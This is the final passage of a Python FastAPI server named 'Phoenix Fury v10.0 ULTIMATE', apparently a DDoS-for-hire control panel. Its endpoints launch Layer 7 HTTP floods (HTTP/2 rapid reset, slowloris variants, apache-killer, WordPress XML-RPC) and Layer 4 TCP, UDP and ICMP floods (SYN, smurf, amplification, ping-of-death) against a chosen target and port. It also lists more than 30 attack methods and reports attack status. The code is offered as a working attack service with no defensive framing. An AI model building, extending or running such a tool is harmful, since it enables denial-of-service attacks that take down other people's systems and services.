    MANAGER.start(config, family)
    
    def delayed_stop():
        time.sleep(config.duration)
        MANAGER.stop()
    
    stop_thread = threading.Thread(target=delayed_stop, daemon=True)
    stop_thread.start()

@app.on_event("startup")
async def on_startup():
    print("=" * 80)
    print(f"🔥 Phoenix Fury v10.0 ULTIMATE API is ONLINE")
    print(f"   System:       {CPU_COUNT} CPU Cores, {TOTAL_RAM_GB:.1f} GB RAM")
    print(f"   Config:       {MAX_PROCESSES} Workers, {REQUESTS_PER_CONNECTION} L7 reqs/conn")
    print(f"   HTTP/2:       {'✅ ENABLED' if H2_AVAILABLE else '❌ DISABLED (pip install h2)'}")
    print(f"   Raw Sockets:  {'✅ YES (L4 Available)' if check_root() else '⚠️ NO (L4 Limited)'}")
    print(f"   Methods:      25+ Attack Vectors Available")
    print("=" * 80)

@app.post("/attack/layer7", status_code=202)
def api_start_l7(config: L7Config, background_tasks: BackgroundTasks):
    """
    Start Layer 7 HTTP attack.
    
    Available methods:
    - Standard: get, post, head, put, delete, options, patch, trace
    - HTTP/2: http2-rapid-reset, http2-flood, http2-slowloris
    - Slowloris: slowloris, slow-post, slow-read, rudy
    - Advanced: apache-killer, range-header, cache-bypass
    """
    run_attack_lifecycle(config, 'l7', background_tasks)
    return {"status": "accepted", "message": f"L7 {config.method.upper()} attack initiated on {config.target}:{config.port}"}

@app.post("/attack/layer4/tcp", status_code=202)
def api_start_l4_tcp(config: L4TCPConfig, background_tasks: BackgroundTasks):
    """
    Start Layer 4 TCP attack.
    
    Available methods:
    - syn, ack, fin, rst, psh, urg
    - syn-ack, xmas, null, land, fragmented
    """
    run_attack_lifecycle(config, 'l4-tcp', background_tasks)
    return {"status": "accepted", "message": f"L4 TCP {config.method.upper()} attack initiated"}

@app.post("/attack/layer4/udp", status_code=202)
def api_start_l4_udp(config: L4UDPConfig, background_tasks: BackgroundTasks):
    """
    Start Layer 4 UDP attack.
    
    Available methods:
    - flood, fragmented, amplification
    """
    run_attack_lifecycle(config, 'l4-udp', background_tasks)
    return {"status": "accepted", "message": f"L4 UDP {config.method.upper()} attack initiated"}

@app.post("/attack/layer4/icmp", status_code=202)
def api_start_l4_icmp(config: L4ICMPConfig, background_tasks: BackgroundTasks):
    """
    Start Layer 4 ICMP attack.
    
    Available methods:
    - ping-flood, smurf, ping-of-death
    """
    run_attack_lifecycle(config, 'l4-icmp', background_tasks)
    return {"status": "accepted", "message": f"L4 ICMP {config.method.upper()} attack initiated"}

@app.post("/attack/stop")
def api_stop_attack():
    """Stop current attack."""
    if not MANAGER.is_active():
        return {"status": "info", "message": "No attack is currently running."}
    MANAGER.stop()
    return {"status": "success", "message": "Attack stopped successfully."}

@app.get("/status", response_model=StatusResponse)
def get_status():
    """Get real-time attack status and system metrics."""
    return MANAGER.get_status()

@app.get("/methods")
def list_methods():
    """List all available attack methods."""
    return {
        "layer7": {
            "standard_http": ["get", "post", "head", "put", "delete", "options", "patch", "trace"],
            "http2_attacks": ["http2-rapid-reset", "http2-flood", "http2-slowloris"],
            "slowloris_variants": ["slowloris", "slow-post", "slow-read", "rudy"],
            "advanced": ["apache-killer", "range-header", "cache-bypass", "xmlrpc", "wordpress-xmlrpc", "hash-collision"]
        },
        "layer4": {
            "tcp": ["syn", "ack", "fin", "rst", "psh", "urg", "syn-ack", "xmas", "null", "land", "fragmented"],
            "udp": ["flood", "fragmented", "amplification"],
            "icmp": ["ping-flood", "smurf", "ping-of-death"]
        },
        "total_methods": 30
    }

@app.get("/")
def root():
    """Root endpoint with API information."""
    return {
        "message": "🔥 Phoenix Fury v10.0 ULTIMATE - Maximum Methods Edition",
        "version": "10.0.0",
        "docs_url": "/docs",
        "status_url": "/status",
        "methods_url": "/methods",
        "features": {
            "http2_rapid_reset": H2_AVAILABLE,
            "raw_sockets": check_root(),
            "auto_optimized": True,
            "total_methods": 30
        },
        "system_info": {
            "cpu_cores": CPU_COUNT,
            "worker_processes": MAX_PROCESSES,
            "ram_gb": round(TOTAL_RAM_GB, 2)
        }
    }

@app.get("/health")
def health_check():
    """Health check endpoint."""
    return {
        "status": "healthy",
        "attack_active": MANAGER.is_active(),
        "timestamp": time.time()
    }

# =============================================================================
# MAIN
# =============================================================================

if __name__ == "__main__":
    multiprocessing.freeze_support()
    
    # Print banner
    print("=" * 80)
    print("🔥 PHOENIX FURY v10.0 ULTIMATE - MAXIMUM METHODS EDITION")
    print("=" * 80)
    print(f"System: {CPU_COUNT} cores, {TOTAL_RAM_GB:.1f}GB RAM")
    print(f"Workers: {MAX_PROCESSES} processes")
    print(f"Methods: 30+ attack vectors")
    print(f"Raw Sockets: {'✅ Available' if check_root() else '⚠️ Limited (no root)'}")
    print("=" * 80)
    
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8000,
        workers=1,
        log_level="info",
        access_log=True
    )
